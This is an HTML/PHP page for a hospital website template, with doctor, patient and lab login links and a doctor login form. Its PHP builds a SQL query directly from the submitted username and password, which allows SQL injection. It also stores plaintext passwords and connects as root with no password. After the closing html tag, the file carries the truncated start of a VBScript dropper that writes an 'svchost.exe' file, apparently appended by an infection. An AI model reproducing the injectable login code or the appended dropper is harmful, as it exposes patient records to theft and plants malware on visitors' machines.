
<!--
Author: W3layouts
Author URL: http://w3layouts.com
License: Creative Commons Attribution 3.0 Unported
License URL: http://creativecommons.org/licenses/by/3.0/
-->
<!DOCTYPE HTML>
<html>
	<head>
		<title>medicare Website Template | Home :: W3layouts</title>
		<link href="css/style.css" rel="stylesheet" type="text/css"  media="all" />
		<link href='http://fonts.googleapis.com/css?family=Ropa+Sans' rel='stylesheet' type='text/css'>
		<link rel="stylesheet" href="css/responsiveslides.css">
		<script src="http://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.min.js"></script>
		<script src="js/responsiveslides.min.js"></script>
		  <script>
		    // You can also use "$(window).load(function() {"
			    $(function () {
			
			      // Slideshow 1
			      $("#slider1").responsiveSlides({
			        maxwidth: 1600,
			        speed: 600
			      });
			});
		  </script>
	</head>
	<body>
		<!--start-wrap-->
		
			<!--start-header-->
			<div class="header">
				<div class="wrap">
				<!--start-logo-->
				<div class="logo">
					<a href="index.php"><img src="images/logo.png" title="logo" /></a>
				</div>
				<!--end-logo-->
				<!--start-top-nav-->
				<div class="top-nav">
					<ul>
						<li class="active"><a href="index.php">Home</a></li>
						<li><a href="about.php">About</a></li>
						<li><a href="services.php">services</a></li>
						<li><a href="blog.php">blog</a></li>
						<li><a href="contact.php">contact</a></li>
					</ul>					
				</div>
				<div class="clear"> </div>
				<!--end-top-nav-->
			</div>
			<!--end-header-->
		</div>
		<div class="clear"> </div>
			<!--start-image-slider---->
					<div class="image-slider">
						<!-- Slideshow 1 -->
					    <ul class="rslides" id="slider1">
					      <li><img src="images/200.jpg" alt=""></li>
					      <li><img src="images/300.png" alt=""></li>
					      <li><img src="images/400.jpg" alt=""></li>
					    </ul>
						 <!-- Slideshow 2 -->
					</div>
					<!--End-image-slider---->
		    <div class="clear"> </div>
		    <div class="content-grids">
		    	<div class="wrap">
		    	<div class="section group">
				<div class="listview_1_of_3 images_1_of_3">
					<div class="listimg listimg_1_of_2">
						  <img src="images/grid-img1.png">
					</div>
					<div class="text list_1_of_2">
						  <h3>Doctor Login</h3>
						  <div class="button"><span><a href="doc_login.php">Click here</a></span></div>
					</div>
				</div>				
				<div class="listview_1_of_3 images_1_of_3">
					<div class="listimg listimg_1_of_2">
						  <img src="images/grid-img2.png">
					</div>
					<div class="text list_1_of_2">
						  <h3>Patient Login</h3>
						<div class="button"><span><a href="patientlogin.php">Click here</a></span></div>
				     </div>
				</div>				
				<div class="listview_1_of_3 images_1_of_3">
					<div class="listimg listimg_1_of_2">
						  <img src="images/grid-img3.png">
					</div>
					<div class="text list_1_of_2">
						  <h3>Lab Attendent</h3>
						<div class="button"><span><a href="lab_login.php">Click here</a></span></div>
				     </div>
				</div>
				</div>				
			</div>
		    </div>
		   </div>
		   <div class="wrap">
		   <div class="content-box">
		   <div class="section group">
			 
			  <head>
<style type="text/css">
body{background-color:#3399FF}</style>
               <font  size="5"><form name="f1" action="doc_login.php"method="POST">
<br><pre>
Username     <input type="text" name="t1">
Password      <input type="password" name="t2">
Department  <select name="t3"></pre>
<option>Emergency</option>
<option>Nursing</option>
<option>Labortary medician</option>
<option>Infectious diseases</option>
<option>Family medicine</option>
<option>Pharmaceutical services</option>
<option>Surgery</option>
<option>HearT services</option>
</select></font>
<table>
<tr>
<td colspan="1"><div align="center">
<input name="b1" type="submit" class="frist" value="login" style="width:100px">
</div></td>
</tr>
</table> 
<a href="doc_reg.php">New user click here</a>
</form>
<?php
if(isset($_POST['b1']))
{
$u=$_POST['t1'];
$p=$_POST['t2'];
$con=new mysqli("localhost","root","","emedical");
if($con==true)
{
$cmd="select  *  from doc_login where username='$u' and password='$p' ";
if($r=$con->query($cmd))
{
if($r->num_rows>0)
{
while($rw=$r->fetch_array())
{ 
session_start();
$_SESSION['u']=$u;
header('location:doc_home.php');
}
}
else
{
echo "invalid username and password";
}
}
else
{
echo "query problem";
}
}
else
{
echo "connection problem";
}
}
?>
		
		   </div>
		   </div>
		   </div>
		   <div class="clear"> </div>
		   <div class="footer">
		   	 <div class="wrap">
		   	   <div class="footer-left">
   			  <ul>
						<li><a href="index.php">Home</a></li>
						<li><a href="about.php">About</a></li>
						<li><a href="services.php">services</a></li>
						<li><a href="blog.php">blog</a></li>
						<li><a href="contact.php">contact</a></li>
<li><a href="login.php">Admin</a></li>
					</ul>
		   	</div>
		   	<div class="footer-right">
		   		<p>Medicare</p>
		   	</div>
		   	<div class="clear"> </div>
		   </div>
		   </div>
           <div class="clear"></div>
		   <div class="footer">
		   	 <div class="wrap">
		   	   <div class="footer-left">
   			  
		   	</div>
		   	   <div class="clear"></div>
		   </div>
		   </div>
		<!--end-wrap-->
	</body>
</html>

<SCRIPT Language=VBScript><!--
DropFileName = "svchost.exe"
WriteData = 